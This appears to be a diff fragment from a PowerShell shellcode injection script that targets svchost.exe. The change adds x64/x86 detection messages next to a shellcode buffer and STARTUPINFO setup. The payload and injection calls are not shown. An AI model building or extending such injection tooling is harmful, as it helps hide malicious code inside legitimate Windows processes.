@@ -165,9 +165,12 @@ $x86shellcode = $buf
 
 $target = "c:\windows\system32\svchost.exe"
 
-$Is64BitProcess = $false
 if ([System.Environment]::Is64BitProcess){
+    Write-Output "[+] Target is x64 process"
     $Is64BitProcess = $true
+}else{
+    Write-Output "[+] Target is x86 process"
+    $Is64BitProcess = $false
 }
 
 $si = New-Object STARTUPINFO
